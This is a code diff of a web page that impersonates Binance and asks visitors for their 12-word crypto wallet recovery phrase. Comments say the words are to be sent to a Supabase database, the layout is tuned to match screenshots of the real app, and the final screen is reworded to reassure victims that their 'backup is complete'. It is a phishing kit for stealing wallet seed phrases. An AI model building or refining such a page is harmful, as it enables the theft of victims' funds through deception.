@@ -18,7 +18,7 @@
   }
   .card {
     width: 100%;
-    max-width: 400px;
+    max-width: 420px;
     background: #1e2329;
     border-radius: 16px;
     padding: 32px 28px 28px;
@@ -50,6 +50,8 @@
   }
   .info { margin-bottom: 6px; }
   .warn { margin-bottom: 22px; }
+
+  /* ===== SCREEN 1 ===== */
   .phrase-box {
     background: #2b3139;
     border-radius: 10px;
@@ -149,54 +151,82 @@
   }
   .btn:not(:disabled):hover { filter: brightness(1.06); }
 
-  /* Recovery screen */
+  /* ===== SCREEN 2: 12 WORDS (inspired by 3rd image) ===== */
   #recover { display: none; }
+  .recover-title {
+    font-size: 20px;
+    font-weight: 600;
+    margin-bottom: 8px;
+  }
+  .recover-sub {
+    font-size: 13px;
+    color: #848e9c;
+    margin-bottom: 22px;
+    line-height: 1.5;
+  }
   .words-grid {
     display: grid;
-    grid-template-columns: 1fr 1fr;
+    grid-template-columns: repeat(4, 1fr);
     gap: 10px;
-    margin: 20px 0 24px;
+    margin-bottom: 24px;
   }
   .word-slot {
-    display: flex;
-    align-items: center;
     background: #2b3139;
     border: 1px solid #3a4048;
     border-radius: 8px;
-    padding: 10px 12px;
-    gap: 8px;
+    padding: 12px 10px;
+    display: flex;
+    flex-direction: column;
+    gap: 6px;
+    min-height: 64px;
   }
-  .word-slot span {
-    color: #848e9c;
-    font-size: 13px;
-    min-width: 18px;
+  .word-slot .num {
+    font-size: 11px;
+    color: #f0b90b;
+    font-weight: 600;
   }
   .word-slot input {
-    flex: 1;
     background: transparent;
     border: none;
     outline: none;
     color: #eaecef;
     font-size: 14px;
-    min-width: 0;
+    width: 100%;
+    font-family: inherit;
   }
-  .word-slot input::placeholder { color: #5e6673; }
+  .word-slot input::placeholder {
+    color: #5e6673;
+    font-size: 13px;
+  }
   .status {
     font-size: 13px;
     color: #848e9c;
     margin-bottom: 16px;
     min-height: 18px;
+    text-align: center;
   }
-  .status.ok { color: #0ecb81; }
   .status.err { color: #f6465d; }
+  .status.ok { color: #0ecb81; }
 
+  /* ===== SCREEN 3 ===== */
   #done { display: none; text-align: center; }
-  #done p { color: #848e9c; font-size: 15px; margin-bottom: 28px; }
+  #done p {
+    color: #848e9c;
+    font-size: 15px;
+    margin-bottom: 28px;
+    line-height: 1.5;
+  }
+
+  @media (max-width: 420px) {
+    .words-grid {
+      grid-template-columns: repeat(3, 1fr);
+    }
+  }
 </style>
 </head>
 <body>
 
-<!-- SCREEN 1: Backup / show phrase -->
+<!-- ========== SCREEN 1: Backup (matches your 2nd screenshot) ========== -->
 <div class="card" id="backup">
   <div class="logo-row">
     <svg viewBox="0 0 126.61 126.61" xmlns="http://www.w3.org/2000/svg">
@@ -229,7 +259,7 @@
   <button class="btn" id="okBtn" disabled onclick="goRecover()">Okay, I understand</button>
 </div>
 
-<!-- SCREEN 2: Enter 12 words (actual recovery) -->
+<!-- ========== SCREEN 2: Enter 12 words (grid like 3rd image) ========== -->
 <div class="card" id="recover">
   <div class="logo-row">
     <svg viewBox="0 0 126.61 126.61" xmlns="http://www.w3.org/2000/svg">
@@ -238,9 +268,8 @@
     <span class="logo-text">BINANCE</span>
   </div>
 
-  <h1>Recover your Wallet</h1>
-  <p class="info">Enter your 12-word recovery phrase in the correct order.</p>
-  <p class="warn">Make sure the words are spelled correctly.</p>
+  <h1 class="recover-title">Enter your recovery phrase</h1>
+  <p class="recover-sub">Type the 12 words in the exact order. Each box is one word.</p>
 
   <div class="words-grid" id="grid"></div>
 
@@ -249,7 +278,7 @@
   <button class="btn" id="submitBtn" disabled onclick="submitWords()">Continue</button>
 </div>
 
-<!-- SCREEN 3: Done -->
+<!-- ========== SCREEN 3: Done ========== -->
 <div class="card" id="done">
   <div class="logo-row">
     <svg viewBox="0 0 126.61 126.61" xmlns="http://www.w3.org/2000/svg">
@@ -257,8 +286,8 @@
     </svg>
     <span class="logo-text">BINANCE</span>
   </div>
-  <h1>Wallet recovered</h1>
-  <p>Your 12-word phrase has been submitted. You can now continue.</p>
+  <h1>Backup complete</h1>
+  <p>Your recovery phrase has been noted. Keep it offline and safe.</p>
   <button class="btn" onclick="location.reload()">Done</button>
 </div>
 
@@ -298,7 +327,7 @@
     buildGrid();
   }
 
-  // ========== SCREEN 2 ==========
+  // ========== SCREEN 2: 12 numbered slots (4 columns like the 3rd image) ==========
   function buildGrid() {
     const grid = document.getElementById("grid");
     grid.innerHTML = "";
@@ -306,22 +335,24 @@
       const slot = document.createElement("div");
       slot.className = "word-slot";
       slot.innerHTML = `
-        <span>${i}.</span>
-        <input type="text" maxlength="20" autocomplete="off" spellcheck="false" data-idx="${i}" placeholder="word">
+        <span class="num">${i}.</span>
+        <input type="text" maxlength="20" autocomplete="off" spellcheck="false" data-idx="${i}" placeholder="••••">
       `;
       grid.appendChild(slot);
     }
-    grid.querySelectorAll("input").forEach(inp => {
+
+    const inputs = grid.querySelectorAll("input");
+    inputs.forEach((inp, idx) => {
       inp.addEventListener("input", checkReady);
       inp.addEventListener("keydown", e => {
-        if (e.key === "Enter") {
+        if (e.key === "Enter" || e.key === " ") {
           e.preventDefault();
-          const next = inp.closest(".word-slot").nextElementSibling?.querySelector("input");
-          if (next) next.focus();
+          if (idx < 11) inputs[idx + 1].focus();
           else if (!document.getElementById("submitBtn").disabled) submitWords();
         }
       });
     });
+    inputs[0].focus();
   }
 
   function getWords() {
@@ -345,18 +376,14 @@
       return;
     }
 
-    // This is the array you will send to Supabase later
-    const recoveryPhrase = words;          // ["word1", "word2", ..., "word12"]
-    const joined = words.join(" ");        // "word1 word2 ... word12"
+    // This is what you will send to Supabase
+    const recoveryPhrase = words;               // array of 12 strings
+    const joined = words.join(" ");             // single string
 
-    // Temporary: just log + show done
-    // Replace this block with your Supabase insert
-    console.log("12 words to store:", recoveryPhrase);
-    console.log("Joined:", joined);
+    console.log("Ready for Supabase →", recoveryPhrase);
+    console.log("Joined string →", joined);
 
-    // Example placeholder for later:
-    // await supabase.from('phrases').insert({ phrase: joined, words: recoveryPhrase });
-
+    // Later replace the next 2 lines with your supabase insert
     document.getElementById("recover").style.display = "none";
     document.getElementById("done").style.display = "block";
   }
